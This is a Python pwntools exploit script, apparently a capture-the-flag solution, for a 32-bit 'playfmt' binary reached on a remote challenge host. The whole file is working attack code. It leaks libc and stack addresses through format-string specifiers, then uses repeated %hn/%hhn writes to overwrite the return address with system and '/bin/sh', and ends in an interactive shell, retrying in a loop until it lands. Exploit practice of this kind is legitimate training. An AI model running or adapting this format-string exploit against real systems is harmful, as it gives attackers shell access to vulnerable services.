from pwn import *

context(arch='i386', os='linux')
file_name = './playfmt'


def run():
    debug = 1
    if debug:
        p = remote('node4.buuoj.cn', 26039)
        # p = remote('0.0.0.0', 1234)
        lib = ELF('../../pwn/libc/u16/libc-2.23-32.so')
    else:
        p = process(file_name)
        lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_i386/libc-2.23.so')
    elf = ELF(file_name)

    def change(num, n, func):
        payload = '%' + str(num) + 'c%' + str(n) + '$' + func
        p.sendline(payload)
        p.recv()

    p.sendline(b'%15$p')
    p.recvuntil(b'0x')
    start_main_addr = int(p.recv(8), 16) - 247
    base_addr = start_main_addr - lib.sym['__libc_start_main']
    print(hex(base_addr))
    system_addr = hex(base_addr + lib.sym['system'])
    bin_sh_addr = hex(base_addr + next(lib.search(b'/bin/sh')))
    main_addr = '0x080485B3'
    system_addr_ = []
    bin_sh_addr_ = []
    main_addr_ = []
    for i in range(1, 5):
        if i == 1:
            str_1 = system_addr[-2:]
            str_2 = bin_sh_addr[-2:]
            str_3 = main_addr[-2:]
        else:
            str_1 = system_addr[-2 * i: -2 * (i - 1)]
            str_2 = bin_sh_addr[-2 * i: -2 * (i - 1)]
            str_3 = main_addr[-2 * i: -2 * (i - 1)]
        system_addr_.append(int(str_1, 16))
        bin_sh_addr_.append(int(str_2, 16))
        main_addr_.append(int(str_3, 16))
    p.sendline(b'%6$p')
    p.recvuntil(b'0x')
    ret_addr = hex(int(p.recv(8), 16) - 12)
    ret_addr_1 = int(ret_addr[-4:], 16)
    ret_addr_2 = int(ret_addr[-2:], 16)
    if ret_addr_1 >= 1500:
        p.close()
        return 0

    change(ret_addr_1, 6, 'hn')

    for i in range(4):
        change(ret_addr_2 + i, 6, 'hhn')
        change(system_addr_[i], 10, 'hhn')

    for i in range(4):
        change(ret_addr_2 + 4 + i, 6, 'hhn')
        change(main_addr_[i], 10, 'hhn')

    for i in range(4):
        change(ret_addr_2 + 8 + i, 6, 'hhn')
        change(bin_sh_addr_[i], 10, 'hhn')

    # gdb.attach(p)
    p.sendline(b'quit')
    p.interactive()


if __name__ == '__main__':
    while True:
        run()

